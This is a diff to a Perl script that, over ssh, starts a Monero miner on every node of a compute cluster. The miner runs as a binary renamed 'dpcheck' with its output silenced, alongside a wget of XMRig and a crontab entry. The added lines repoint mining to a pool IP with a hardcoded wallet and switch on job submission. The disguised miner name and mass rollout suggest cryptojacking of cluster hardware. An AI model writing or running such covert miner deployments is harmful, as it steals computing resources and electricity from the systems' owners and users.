@@ -1,6 +1,9 @@
 =b
 wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
 crontab perl /root/xmr/xmr/xmr.pl
+nohup /home/jsp/cluster/dpcheck --coin=XMR -o 54.238.145.148:2222 \
+       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.190-master \
+       -p x 2>&1 >/dev/null &
 =cut
 use warnings;
 use strict;
@@ -12,8 +15,8 @@ my $miner = "lolminer";# or lolminer
 my $threads = 2; #thread no for node with 
 ###main jobs to do
 #my $killjobs = "yes";
-my $sumitjobs = "no";
-my $killjobs = "yes";
+my $sumitjobs = "yes";
+my $killjobs = "no";
 #my $sumitjobs = "no";
 my $checkstatus = "yes";
 my %nodes = (
@@ -64,10 +67,10 @@ $pm->start and next;
     my $nodeindex=sprintf("%02d",$_);
     my $nodename= "node"."$nodeindex";
     my $cmd = "/usr/bin/ssh $nodename ";
-    my $mining_x = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 18.167.166.214:2222 \\
+    my $mining_x = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 54.238.145.148:2222 \\
        -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$cluster-$nodename \\
        -p x 2>&1 >/dev/null &";
-    my $mining_t = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 18.167.166.214:2222 \\
+    my $mining_t = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 54.238.145.148:2222 \\
        -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$cluster-$nodename \\
        -p x --threads=$threads 2>&1 >/dev/null &";
 
